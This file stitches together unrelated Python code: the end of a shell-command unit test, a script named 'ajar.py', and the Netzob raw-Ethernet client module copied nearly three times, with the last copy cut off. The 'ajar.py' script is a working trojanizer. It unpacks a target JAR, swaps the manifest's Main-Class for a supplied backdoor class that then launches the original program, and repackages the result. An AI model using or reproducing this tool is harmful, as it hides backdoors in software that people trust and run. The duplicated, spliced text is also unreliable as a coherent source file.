        stdout, stderr = run_shell_command(command, "1 p 5")

        self.assertEqual(stdout, "")
        self.assertEqual(stderr, "INVALID INPUT\n")

    def test_run_shell_command_kwargs_delegation(self):
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", weird_parameter2="abc")

        # Test one of the forbidden parameters.
        with self.assertRaises(TypeError):
            run_shell_command("super-cool-command", universal_newlines=False)


class PrepareStringArgumentTest(unittest.TestCase):

    def setUp(self):
        self.test_strings = ("normal_string",
                             "string with spaces",
                             'string with quotes"a',
                             "string with s-quotes'b",
                             "bsn \n A",
                             "unrecognized \\q escape")

    def test_prepare_string_argument_sh(self):
        expected_results = ('"normal_string"',
                            '"string with spaces"',
                            '"string with quotes\\"a"',
                            '"string with s-quotes\'b"',
                            '"bsn \n A"',
                            '"unrecognized \\q escape"')

        for string, result in zip(self.test_strings, expected_results):
            self.assertEqual(prepare_string_argument(string, "sh"),
                             result)

    def test_prepare_string_argument_unsupported(self):
        for string in self.test_strings:
            self.assertEqual(prepare_string_argument(string, "WeIrD_O/S"),
                             string)

import zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = "backdoor.jar"

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, "b:t:o:", ["backdoor=", "target=", "outfile="])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in ("-b", "--backdoor"):
            backdoor = arg
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-o", "--outfile"):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile("%s" % (dst), "w")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print("[*] Starting backdoor process")
    print("[*] Decompressing target to tmp directory...")
    #subprocess.call("jar -x %s" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall("tmp")
    print("[*] Target dumped to tmp directory")

    print("[*] Modifying manifest file...")
    oldmain=""
    man = open("tmp/META-INF/MANIFEST.MF","r").read()
    with open("tmp/META-INF/MANIFEST.MF","w") as f:
        for l in man.split("\n"):
            if "Main-Class" in l:
                oldmain=l[12:]
                f.write("Main-Class: %s\n" % "Backdoor")
            else:
                f.write("%s\n" % l)
    print("[*] Manifest file modified")
    
    print("[*] Modifying provided backdoor...")
    inmain=False
    level=0
    bd=open(backdoor, "r").read()
    with open("tmp/%s" % backdoor,'w') as f:
        for l in bd.split("\n"):
            if "main(" in l:
                inmain=True
                f.write(l)
            elif "}" in l and level<2 and inmain:
                f.write("%s.main(args);}" % oldmain)
                inmain=False
            elif "}" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif "{" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print("[*] Provided backdoor successfully modified")

    print("[*] Compiling modified backdoor...")
    if subprocess.call("javac -cp tmp/ tmp/%s" % backdoor, shell=True) != 0:                    
        print("[!] Error compiling %s" % backdoor)
    print("[*] Compiled modified backdoor")
                
    if(len(oldmain)<1):
        print("[!] Main-Class manifest attribute not found")
    else:
        print("[*] Repackaging target jar file...")
        createZip("tmp",outfile)
        print("[*] Target jar successfully repackaged")
    shutil.rmtree('tmp/')
    
if __name__ == "__main__":
    main(sys.argv[1:])

#-*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|          01001110 01100101 01110100 01111010 01101111 01100010            |
#|                                                                           |
#|               Netzob : Inferring communication protocols                  |
#+---------------------------------------------------------------------------+
#| Copyright (C) 2011-2017 Georges Bossert and Frédéric Guihéry              |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#| @url      : http://www.netzob.org                                         |
#| @contact  : contact@netzob.org                                            |
#| @sponsors : Amossys, http://www.amossys.fr                                |
#|             Supélec, http://www.rennes.supelec.fr/ren/rd/cidre/           |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| File contributors :                                                       |
#|       - Frédéric Guihéry <frederic.guihery (a) amossys.fr>                |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Standard library imports                                                  |
#+---------------------------------------------------------------------------+
import socket
from bitarray import bitarray
import struct
from fcntl import ioctl
import arpreq
import subprocess
import time
import binascii

#+---------------------------------------------------------------------------+
#| Related third party imports                                               |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Local application imports                                                 |
#+---------------------------------------------------------------------------+
from netzob.Common.Utils.Decorators import typeCheck, NetzobLogger
from netzob.Simulator.Channels.AbstractChannel import AbstractChannel
from netzob.Model.Vocabulary.Field import Field
from netzob.Model.Vocabulary.Symbol import Symbol
from netzob.Model.Types.IPv4 import IPv4
from netzob.Model.Types.Raw import Raw
from netzob.Model.Types.BitArray import BitArray
from netzob.Model.Types.Integer import Integer
from netzob.Model.Types.AbstractType import AbstractType
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Size import Size
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Data import Data
from netzob.Model.Vocabulary.Domain.Variables.Leafs.InternetChecksum import InternetChecksum
from netzob.Model.Vocabulary.Domain.Variables.SVAS import SVAS


@NetzobLogger
class RawEthernetClient(AbstractChannel):
    """A RawEthernetClient is a communication channel allowing to send IP
    payloads. This channel is responsible for building the IP layer.

    Interesting link: http://www.offensivepython.com/2014/09/packet-injection-capturing-response.html

    >>> from netzob.all import *
    >>> client = RawEthernetClient(remoteIP='127.0.0.1')
    >>> client.open()
    >>> symbol = Symbol([Field("Hello Zoby !")])
    >>> client.write(symbol.specialize())
    >>> client.close()

    """

    ETH_P_ALL = 3

    @typeCheck(str, int)
    def __init__(self,
                 remoteIP,
                 localIP=None,
                 upperProtocol=socket.IPPROTO_TCP,
                 interface="eth0",
                 timeout=5):
        super(RawEthernetClient, self).__init__(isServer=False)
        self.remoteIP = remoteIP
        self.localIP = localIP
        self.upperProtocol = upperProtocol
        self.interface = interface
        self.timeout = timeout
        self.__socket = None
        self.header = None  # The IP header symbol format
        self.header_presets = {}  # Dict used to parameterize IP header fields
        self.type = AbstractChannel.TYPE_RAWETHERNETCLIENT

        # Header initialization
        self.initHeader()

    def open(self, timeout=None):
        """Open the communication channel. If the channel is a client, it starts to connect
        to the specified server.
        """

        if self.isOpen:
            raise RuntimeError(
                "The channel is already open, cannot open it again")

        self.__socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(RawEthernetClient.ETH_P_ALL))
        self.__socket.bind((self.interface, RawEthernetClient.ETH_P_ALL))
        self.isOpen = True

    def close(self):
        """Close the communication channel."""
        if self.__socket is not None:
            self.__socket.close()
        self.isOpen = False

    def read(self, timeout=None):
        """Read the next message on the communication channel.

        @keyword timeout: the maximum time in millisecond to wait before a message can be reached
        @type timeout: :class:`int`
        """
        # TODO: handle timeout
        if self.__socket is not None:
            (data, _) = self.__socket.recvfrom(65535)

            # Remove Ethernet header from received data
            ethHeaderLen = 14  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ethHeaderLen:
                data = data[ethHeaderLen:]

            # Remove IP header from received data
            ipHeaderLen = (data[0] & 15) * 4  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ipHeaderLen:
                data = data[ipHeaderLen:]
            return data
        else:
            raise Exception("socket is not available")

    def writePacket(self, data):
        """Write on the communication channel the specified data

        :parameter data: the data to write on the channel
        :type data: binary object
        """

        if self.header is None:
            raise Exception("IP header structure is None")

        if self.__socket is None:
            raise Exception("socket is not available")

        self.header_presets['ip.payload'] = data
        packet = self.header.specialize(presets=self.header_presets)
        len_data = self.__socket.sendto(packet, (self.interface, RawEthernetClient.ETH_P_ALL))
        return len_data

    @typeCheck(bytes)
    def sendReceive(self, data, timeout=None):
        """Write on the communication channel the specified data and returns the corresponding response

        :parameter data: the data to write on the channel
        :type data: binary object
        @type timeout: :class:`int`
        """
        if self.__socket is not None:
            # get the ports from message to identify the good response (in TCP or UDP)
            portSrcTx = (data[0] * 256) + data[1]
            portDstTx = (data[2] * 256) + data[3]

            responseOk = False
            stopWaitingResponse = False
            self.write(data)
            while stopWaitingResponse is False:
                # TODO: handle timeout
                dataReceived = self.read(timeout)
                portSrcRx = (dataReceived[0] * 256) + dataReceived[1]
                portDstRx = (dataReceived[2] * 256) + dataReceived[3]
                stopWaitingResponse = (portSrcTx == portDstRx) and (portDstTx == portSrcRx)
                if stopWaitingResponse:  # and not timeout
                    responseOk = True
            if responseOk:
                return dataReceived
        else:
            raise Exception("socket is not available")

    def get_interface_addr(self, ifname):
        SIOCGIFHWADDR = 0x8927
        s = socket.socket()
        response = ioctl(s, SIOCGIFHWADDR, struct.pack("16s16x",ifname))
        s.close()
        return struct.unpack("16xh6s8x", response)

    def initHeader(self):
        """Initialize the IP header according to the IP format definition.

        """

        # Ethernet header

        # Retrieve remote MAC address
        dstMacAddr = arpreq.arpreq(self.remoteIP)
        if dstMacAddr is not None:
            dstMacAddr = dstMacAddr.replace(':', '')
            dstMacAddr = binascii.unhexlify(dstMacAddr)
        else:
            # Force ARP resolution
            p = subprocess.Popen("ping -c1 {}".format(self.remoteIP), shell=True)                    
            p.wait()
            time.sleep(0.1)

            dstMacAddr = arpreq.arpreq(self.remoteIP)
            if dstMacAddr is not None:
                dstMacAddr = dstMacAddr.replace(':', '')
                dstMacAddr = binascii.unhexlify(dstMacAddr)
            else:
                raise Exception("Cannot resolve IP address to a MAC address for IP: '{}'".format(self.remoteIP))

        # Retrieve local MAC address
        srcMacAddr = self.get_interface_addr(bytes(self.interface, 'utf-8'))[1]

        eth_dst = Field(name='eth.dst', domain=Raw(dstMacAddr))
        eth_src = Field(name='eth.src', domain=Raw(srcMacAddr))
        eth_type = Field(name='eth.type', domain=Raw(b"\x08\x00"))


        # IP header

        ip_ver = Field(
            name='ip.version', domain=BitArray(
                value=bitarray('0100')))  # IP Version 4
        ip_ihl = Field(name='ip.hdr_len', domain=BitArray(bitarray('0000')))
        ip_tos = Field(
            name='ip.tos',
            domain=Data(
                dataType=BitArray(nbBits=8),
                originalValue=bitarray('00000000'),
                svas=SVAS.PERSISTENT))
        ip_tot_len = Field(
            name='ip.len', domain=BitArray(bitarray('0000000000000000')))
        ip_id = Field(name='ip.id', domain=BitArray(nbBits=16))
        ip_flags = Field(name='ip.flags', domain=Data(dataType=BitArray(nbBits=3), originalValue=bitarray('000'), svas=SVAS.PERSISTENT))
        ip_frag_off = Field(name='ip.fragment', domain=Data(dataType=BitArray(nbBits=13), originalValue=bitarray('0000000000000'), svas=SVAS.PERSISTENT))
        ip_ttl = Field(name='ip.ttl', domain=Data(dataType=BitArray(nbBits=8), originalValue=bitarray('01000000'), svas=SVAS.PERSISTENT))
        ip_proto = Field(name='ip.proto', domain=Integer(value=self.upperProtocol, unitSize=AbstractType.UNITSIZE_8, endianness=AbstractType.ENDIAN_BIG, sign=AbstractType.SIGN_UNSIGNED))
        ip_checksum = Field(name='ip.checksum', domain=BitArray(bitarray('0000000000000000')))
        ip_saddr = Field(name='ip.src', domain=IPv4(self.localIP))
        ip_daddr = Field(
            name='ip.dst', domain=IPv4(self.remoteIP))
        ip_payload = Field(name='ip.payload', domain=Raw())

        ip_ihl.domain = Size([ip_ver,
                              ip_ihl,
                              ip_tos,
                              ip_tot_len,
                              ip_id, ip_flags,
                              ip_frag_off,
                              ip_ttl, ip_proto,
                              ip_checksum,
                              ip_saddr,
                              ip_daddr], dataType=BitArray(nbBits=4), factor=1/float(32))
        ip_tot_len.domain = Size([ip_ver,
                                  ip_ihl,
                                  ip_tos,
                                  ip_tot_len,
                                  ip_id,
                                  ip_flags,
                                  ip_frag_off,
                                  ip_ttl,
                                  ip_proto,
                                  ip_checksum,
                                  ip_saddr,
                                  ip_daddr,
                                  ip_payload], dataType=Integer(unitSize=AbstractType.UNITSIZE_16, sign=AbstractType.SIGN_UNSIGNED), factor=1/float(8))
        ip_checksum.domain = InternetChecksum(fields=[ip_ver,
                                                      ip_ihl,
                                                      ip_tos,
                                                      ip_tot_len,
                                                      ip_id,
                                                      ip_flags,
                                                      ip_frag_off,
                                                      ip_ttl,
                                                      ip_proto,
                                                      ip_checksum,
                                                      ip_saddr,
                                                      ip_daddr], dataType=Raw(nbBytes=2, unitSize=AbstractType.UNITSIZE_16))
        
        self.header = Symbol(name='Ethernet layer', fields=[eth_dst,
                                                            eth_src,
                                                            eth_type,
                                                            ip_ver,
                                                            ip_ihl,
                                                            ip_tos,
                                                            ip_tot_len,
                                                            ip_id,
                                                            ip_flags,
                                                            ip_frag_off,
                                                            ip_ttl,
                                                            ip_proto,
                                                            ip_checksum,
                                                            ip_saddr,
                                                            ip_daddr,
                                                            ip_payload])

    # Management methods

    # Properties

    @property
    def remoteIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__remoteIP

    @remoteIP.setter
    @typeCheck(str)
    def remoteIP(self, remoteIP):
        if remoteIP is None:
            raise TypeError("Listening IP cannot be None")

        self.__remoteIP = remoteIP

    @property
    def localIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__localIP

    @localIP.setter
    @typeCheck(str)
    def localIP(self, localIP):
        self.__localIP = localIP

    @property
    def upperProtocol(self):
        """Upper protocol, such as TCP, UDP, ICMP, etc.

        :type: :class:`str`
        """
        return self.__upperProtocol

    @upperProtocol.setter
    @typeCheck(int)
    def upperProtocol(self, upperProtocol):
        if upperProtocol is None:
            raise TypeError("Upper protocol cannot be None")

        self.__upperProtocol = upperProtocol

    @property
    def interface(self):
        """Interface such as eth0, lo.

        :type: :class:`str`
        """
        return self.__interface

    @interface.setter
    @typeCheck(str)
    def interface(self, interface):
        if interface is None:
            raise TypeError("Interface cannot be None")

        self.__interface = interface

    @property
    def timeout(self):
        return self.__timeout

    @timeout.setter
    @typeCheck(int)
    def timeout(self, timeout):
        self.__timeout = timeout

#-*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|          01001110 01100101 01110100 01111010 01101111 01100010            |
#|                                                                           |
#|               Netzob : Inferring communication protocols                  |
#+---------------------------------------------------------------------------+
#| Copyright (C) 2011-2017 Georges Bossert and Frédéric Guihéry              |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#| @url      : http://www.netzob.org                                         |
#| @contact  : contact@netzob.org                                            |
#| @sponsors : Amossys, http://www.amossys.fr                                |
#|             Supélec, http://www.rennes.supelec.fr/ren/rd/cidre/           |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| File contributors :                                                       |
#|       - Frédéric Guihéry <frederic.guihery (a) amossys.fr>                |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Standard library imports                                                  |
#+---------------------------------------------------------------------------+
import socket
from bitarray import bitarray
import struct
from fcntl import ioctl
import arpreq
import subprocess
import time
import binascii

#+---------------------------------------------------------------------------+
#| Related third party imports                                               |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Local application imports                                                 |
#+---------------------------------------------------------------------------+
from netzob.Common.Utils.Decorators import typeCheck, NetzobLogger
from netzob.Simulator.Channels.AbstractChannel import AbstractChannel
from netzob.Model.Vocabulary.Field import Field
from netzob.Model.Vocabulary.Symbol import Symbol
from netzob.Model.Types.IPv4 import IPv4
from netzob.Model.Types.Raw import Raw
from netzob.Model.Types.BitArray import BitArray
from netzob.Model.Types.Integer import Integer
from netzob.Model.Types.AbstractType import AbstractType
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Size import Size
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Data import Data
from netzob.Model.Vocabulary.Domain.Variables.Leafs.InternetChecksum import InternetChecksum
from netzob.Model.Vocabulary.Domain.Variables.SVAS import SVAS


@NetzobLogger
class RawEthernetClient(AbstractChannel):
    """A RawEthernetClient is a communication channel allowing to send IP
    payloads. This channel is responsible for building the IP layer.

    Interesting link: http://www.offensivepython.com/2014/09/packet-injection-capturing-response.html

    >>> from netzob.all import *
    >>> client = RawEthernetClient(remoteIP='127.0.0.1')
    >>> client.open()
    >>> symbol = Symbol([Field("Hello Zoby !")])
    >>> client.write(symbol.specialize())
    >>> client.close()

    """

    ETH_P_ALL = 3

    @typeCheck(str, int)
    def __init__(self,
                 remoteIP,
                 localIP=None,
                 upperProtocol=socket.IPPROTO_TCP,
                 interface="eth0",
                 timeout=5):
        super(RawEthernetClient, self).__init__(isServer=False)
        self.remoteIP = remoteIP
        self.localIP = localIP
        self.upperProtocol = upperProtocol
        self.interface = interface
        self.timeout = timeout
        self.__socket = None
        self.header = None  # The IP header symbol format
        self.header_presets = {}  # Dict used to parameterize IP header fields
        self.type = AbstractChannel.TYPE_RAWETHERNETCLIENT

        # Header initialization
        self.initHeader()

    def open(self, timeout=None):
        """Open the communication channel. If the channel is a client, it starts to connect
        to the specified server.
        """

        if self.isOpen:
            raise RuntimeError(
                "The channel is already open, cannot open it again")

        self.__socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(RawEthernetClient.ETH_P_ALL))
        self.__socket.bind((self.interface, RawEthernetClient.ETH_P_ALL))
        self.isOpen = True

    def close(self):
        """Close the communication channel."""
        if self.__socket is not None:
            self.__socket.close()
        self.isOpen = False

    def read(self, timeout=None):
        """Read the next message on the communication channel.

        @keyword timeout: the maximum time in millisecond to wait before a message can be reached
        @type timeout: :class:`int`
        """
        # TODO: handle timeout
        if self.__socket is not None:
            (data, _) = self.__socket.recvfrom(65535)

            # Remove Ethernet header from received data
            ethHeaderLen = 14  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ethHeaderLen:
                data = data[ethHeaderLen:]

            # Remove IP header from received data
            ipHeaderLen = (data[0] & 15) * 4  # (Bitwise AND 00001111) x 4bytes --> see RFC-791
            if len(data) > ipHeaderLen:
                data = data[ipHeaderLen:]
            return data
        else:
            raise Exception("socket is not available")

    def writePacket(self, data):
        """Write on the communication channel the specified data

        :parameter data: the data to write on the channel
        :type data: binary object
        """

        if self.header is None:
            raise Exception("IP header structure is None")

        if self.__socket is None:
            raise Exception("socket is not available")

        self.header_presets['ip.payload'] = data
        packet = self.header.specialize(presets=self.header_presets)
        len_data = self.__socket.sendto(packet, (self.interface, RawEthernetClient.ETH_P_ALL))
        return len_data

    @typeCheck(bytes)
    def sendReceive(self, data, timeout=None):
        """Write on the communication channel the specified data and returns the corresponding response

        :parameter data: the data to write on the channel
        :type data: binary object
        @type timeout: :class:`int`
        """
        if self.__socket is not None:
            # get the ports from message to identify the good response (in TCP or UDP)
            portSrcTx = (data[0] * 256) + data[1]
            portDstTx = (data[2] * 256) + data[3]

            responseOk = False
            stopWaitingResponse = False
            self.write(data)
            while stopWaitingResponse is False:
                # TODO: handle timeout
                dataReceived = self.read(timeout)
                portSrcRx = (dataReceived[0] * 256) + dataReceived[1]
                portDstRx = (dataReceived[2] * 256) + dataReceived[3]
                stopWaitingResponse = (portSrcTx == portDstRx) and (portDstTx == portSrcRx)
                if stopWaitingResponse:  # and not timeout
                    responseOk = True
            if responseOk:
                return dataReceived
        else:
            raise Exception("socket is not available")

    def get_interface_addr(self, ifname):
        SIOCGIFHWADDR = 0x8927
        s = socket.socket()
        response = ioctl(s, SIOCGIFHWADDR, struct.pack("16s16x",ifname))
        s.close()
        return struct.unpack("16xh6s8x", response)

    def initHeader(self):
        """Initialize the IP header according to the IP format definition.

        """

        # Ethernet header

        # Retrieve remote MAC address
        dstMacAddr = arpreq.arpreq(self.remoteIP)
        if dstMacAddr is not None:
            dstMacAddr = dstMacAddr.replace(':', '')
            dstMacAddr = binascii.unhexlify(dstMacAddr)
        else:
            # Force ARP resolution
            p = subprocess.Popen("ping -c1 {}".format(self.remoteIP), shell=True)                    
            p.wait()
            time.sleep(0.1)

            dstMacAddr = arpreq.arpreq(self.remoteIP)
            if dstMacAddr is not None:
                dstMacAddr = dstMacAddr.replace(':', '')
                dstMacAddr = binascii.unhexlify(dstMacAddr)
            else:
                raise Exception("Cannot resolve IP address to a MAC address for IP: '{}'".format(self.remoteIP))

        # Retrieve local MAC address
        srcMacAddr = self.get_interface_addr(bytes(self.interface, 'utf-8'))[1]

        eth_dst = Field(name='eth.dst', domain=Raw(dstMacAddr))
        eth_src = Field(name='eth.src', domain=Raw(srcMacAddr))
        eth_type = Field(name='eth.type', domain=Raw(b"\x08\x00"))


        # IP header

        ip_ver = Field(
            name='ip.version', domain=BitArray(
                value=bitarray('0100')))  # IP Version 4
        ip_ihl = Field(name='ip.hdr_len', domain=BitArray(bitarray('0000')))
        ip_tos = Field(
            name='ip.tos',
            domain=Data(
                dataType=BitArray(nbBits=8),
                originalValue=bitarray('00000000'),
                svas=SVAS.PERSISTENT))
        ip_tot_len = Field(
            name='ip.len', domain=BitArray(bitarray('0000000000000000')))
        ip_id = Field(name='ip.id', domain=BitArray(nbBits=16))
        ip_flags = Field(name='ip.flags', domain=Data(dataType=BitArray(nbBits=3), originalValue=bitarray('000'), svas=SVAS.PERSISTENT))
        ip_frag_off = Field(name='ip.fragment', domain=Data(dataType=BitArray(nbBits=13), originalValue=bitarray('0000000000000'), svas=SVAS.PERSISTENT))
        ip_ttl = Field(name='ip.ttl', domain=Data(dataType=BitArray(nbBits=8), originalValue=bitarray('01000000'), svas=SVAS.PERSISTENT))
        ip_proto = Field(name='ip.proto', domain=Integer(value=self.upperProtocol, unitSize=AbstractType.UNITSIZE_8, endianness=AbstractType.ENDIAN_BIG, sign=AbstractType.SIGN_UNSIGNED))
        ip_checksum = Field(name='ip.checksum', domain=BitArray(bitarray('0000000000000000')))
        ip_saddr = Field(name='ip.src', domain=IPv4(self.localIP))
        ip_daddr = Field(
            name='ip.dst', domain=IPv4(self.remoteIP))
        ip_payload = Field(name='ip.payload', domain=Raw())

        ip_ihl.domain = Size([ip_ver,
                              ip_ihl,
                              ip_tos,
                              ip_tot_len,
                              ip_id, ip_flags,
                              ip_frag_off,
                              ip_ttl, ip_proto,
                              ip_checksum,
                              ip_saddr,
                              ip_daddr], dataType=BitArray(nbBits=4), factor=1/float(32))
        ip_tot_len.domain = Size([ip_ver,
                                  ip_ihl,
                                  ip_tos,
                                  ip_tot_len,
                                  ip_id,
                                  ip_flags,
                                  ip_frag_off,
                                  ip_ttl,
                                  ip_proto,
                                  ip_checksum,
                                  ip_saddr,
                                  ip_daddr,
                                  ip_payload], dataType=Integer(unitSize=AbstractType.UNITSIZE_16, sign=AbstractType.SIGN_UNSIGNED), factor=1/float(8))
        ip_checksum.domain = InternetChecksum(fields=[ip_ver,
                                                      ip_ihl,
                                                      ip_tos,
                                                      ip_tot_len,
                                                      ip_id,
                                                      ip_flags,
                                                      ip_frag_off,
                                                      ip_ttl,
                                                      ip_proto,
                                                      ip_checksum,
                                                      ip_saddr,
                                                      ip_daddr], dataType=Raw(nbBytes=2, unitSize=AbstractType.UNITSIZE_16))
        
        self.header = Symbol(name='Ethernet layer', fields=[eth_dst,
                                                            eth_src,
                                                            eth_type,
                                                            ip_ver,
                                                            ip_ihl,
                                                            ip_tos,
                                                            ip_tot_len,
                                                            ip_id,
                                                            ip_flags,
                                                            ip_frag_off,
                                                            ip_ttl,
                                                            ip_proto,
                                                            ip_checksum,
                                                            ip_saddr,
                                                            ip_daddr,
                                                            ip_payload])

    # Management methods

    # Properties

    @property
    def remoteIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__remoteIP

    @remoteIP.setter
    @typeCheck(str)
    def remoteIP(self, remoteIP):
        if remoteIP is None:
            raise TypeError("Listening IP cannot be None")

        self.__remoteIP = remoteIP

    @property
    def localIP(self):
        """IP on which the server will listen.

        :type: :class:`str`
        """
        return self.__localIP

    @localIP.setter
    @typeCheck(str)
    def localIP(self, localIP):
        self.__localIP = localIP

    @property
    def upperProtocol(self):
        """Upper protocol, such as TCP, UDP, ICMP, etc.

        :type: :class:`str`
        """
        return self.__upperProtocol

    @upperProtocol.setter
    @typeCheck(int)
    def upperProtocol(self, upperProtocol):
        if upperProtocol is None:
            raise TypeError("Upper protocol cannot be None")

        self.__upperProtocol = upperProtocol

    @property
    def interface(self):
        """Interface such as eth0, lo.

        :type: :class:`str`
        """
        return self.__interface

    @interface.setter
    @typeCheck(str)
    def interface(self, interface):
        if interface is None:
            raise TypeError("Interface cannot be None")

        self.__interface = interface

    @property
    def timeout(self):
        return self.__timeout

    @timeout.setter
    @typeCheck(int)
    def timeout(self, timeout):
        self.__timeout = timeout

#-*- coding: utf-8 -*-

#+---------------------------------------------------------------------------+
#|          01001110 01100101 01110100 01111010 01101111 01100010            |
#|                                                                           |
#|               Netzob : Inferring communication protocols                  |
#+---------------------------------------------------------------------------+
#| Copyright (C) 2011-2017 Georges Bossert and Frédéric Guihéry              |
#| This program is free software: you can redistribute it and/or modify      |
#| it under the terms of the GNU General Public License as published by      |
#| the Free Software Foundation, either version 3 of the License, or         |
#| (at your option) any later version.                                       |
#|                                                                           |
#| This program is distributed in the hope that it will be useful,           |
#| but WITHOUT ANY WARRANTY; without even the implied warranty of            |
#| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the              |
#| GNU General Public License for more details.                              |
#|                                                                           |
#| You should have received a copy of the GNU General Public License         |
#| along with this program. If not, see <http://www.gnu.org/licenses/>.      |
#+---------------------------------------------------------------------------+
#| @url      : http://www.netzob.org                                         |
#| @contact  : contact@netzob.org                                            |
#| @sponsors : Amossys, http://www.amossys.fr                                |
#|             Supélec, http://www.rennes.supelec.fr/ren/rd/cidre/           |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| File contributors :                                                       |
#|       - Frédéric Guihéry <frederic.guihery (a) amossys.fr>                |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Standard library imports                                                  |
#+---------------------------------------------------------------------------+
import socket
from bitarray import bitarray
import struct
from fcntl import ioctl
import arpreq
import subprocess
import time
import binascii

#+---------------------------------------------------------------------------+
#| Related third party imports                                               |
#+---------------------------------------------------------------------------+

#+---------------------------------------------------------------------------+
#| Local application imports                                                 |
#+---------------------------------------------------------------------------+
from netzob.Common.Utils.Decorators import typeCheck, NetzobLogger
from netzob.Simulator.Channels.AbstractChannel import AbstractChannel
from netzob.Model.Vocabulary.Field import Field
from netzob.Model.Vocabulary.Symbol import Symbol
from netzob.Model.Types.IPv4 import IPv4
from netzob.Model.Types.Raw import Raw
from netzob.Model.Types.BitArray import BitArray
from netzob.Model.Types.Integer import Integer
from netzob.Model.Types.AbstractType import AbstractType
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Size import Size
from netzob.Model.Vocabulary.Domain.Variables.Leafs.Data import Data
from netzob.Model.Vocabulary.Domain.Variables.Leafs.InternetChecksum import InternetChecksum
from netzob.Model.Vocabulary.Domain.Variables.SVAS import SVAS


@NetzobLogger
class RawEthernetClient(AbstractChannel):
    """A RawEthernetClient is a communication channel allowing to send IP
    payloads. This channel is responsible for building the IP layer.

    Interesting link: http://www.offensivepython.com/2014/09/packet-injection-capturing-response.html

    >>> from netzob.all import *
    >>> client = RawEthernetClient(remoteIP='127.0.0.1')
    >>> client.open()
    >>> symbol = Symbol([Field("Hello Zoby !")])
    >>> client.write(symbol.specialize())
    >>> client.close()

    """

    ETH_P_ALL = 3

    @typeCheck(str, int)
    def __init__(self,
                 remoteIP,
                 localIP=None,
                 upperProtocol=socket.IPPROTO_TCP,
                 interface="eth0",
                 timeout=5):
        super(RawEthernetClient, self).__init__(isServer=False)
        self.remoteIP = remoteIP
        self.localIP = localIP
        self.upperProtocol = upperProtocol
        self.interface = interface
        self.timeout = timeout
        self.__socket = None
        self.header = None  # The IP header symbol format
        self.header_presets = {}  # Dict used to parameterize IP header fields
        self.type = AbstractChannel.TYPE_RAWETHERNETCLIENT

        # Header initialization
        self.initHeader()

    def open(self, timeout=None):
        """Open the communication channel. If the channel is a client, it starts to connect
        to the specified server.
        """

        if self.isOpen:
            raise RuntimeError(
                "The channel is already open, cannot open it again")

        self.__socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(RawEthernetClient.ETH_P_ALL))
        self.__socket.bind((self.interface, RawEthernetClient.ETH_P_ALL))
        self.isOpen = True

    def close(self):
